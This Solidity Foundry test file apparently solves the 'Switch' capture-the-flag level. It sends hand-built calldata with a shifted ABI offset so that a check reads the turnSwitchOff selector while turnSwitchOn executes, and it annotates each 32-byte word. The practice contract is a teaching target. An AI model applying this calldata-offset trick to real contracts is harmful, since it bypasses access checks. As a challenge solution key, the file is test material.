// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./SwitchFactory.sol";

contract SwitchTest is Test {
    SwitchFactory factory;
    address switchInstance;

    function setUp() public {
        factory = new SwitchFactory();
        switchInstance = factory.createInstance(address(this));
    }

    function testSwitch() public {
        bytes memory data = abi.encodeWithSelector(
            bytes4(keccak256("flipSwitch(bytes)")), abi.encodeWithSelector(bytes4(keccak256("turnSwitchOff()")))
        );
        /**
         * 0x30c13ade                                                           // selector of flipSwitch(bytes)
         * 0000000000000000000000000000000000000000000000000000000000000020     // offset of _data
         * 0000000000000000000000000000000000000000000000000000000000000004     // length of _data
         * 20606e1500000000000000000000000000000000000000000000000000000000     // selector of turnSwitchOff()
         */

        (bool success, bytes memory err) = switchInstance.call(data);
        if (!success) {
            console.logBytes(err);
        }
        assertTrue(!Switch(switchInstance).switchOn());

        /**
         * 0x30c13ade                                                           // selector of flipSwitch(bytes)
         * 0000000000000000000000000000000000000000000000000000000000000060     // offset of _data
         * ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff     // placeholder, content doesn't matter, length is 32 bytes
         * 20606e1500000000000000000000000000000000000000000000000000000000     // selector of turnSwitchOff()
         * 0000000000000000000000000000000000000000000000000000000000000004     // length of _data
         * 76227e1200000000000000000000000000000000000000000000000000000000     // selector of turnSwitchOn()
         */
        data =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff20606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (success, err) = switchInstance.call(data);
        if (!success) {
            console.logBytes(err);
        }
        assertTrue(Switch(switchInstance).switchOn());

        assertTrue(factory.validateInstance(payable(switchInstance), address(this)));
    }
}
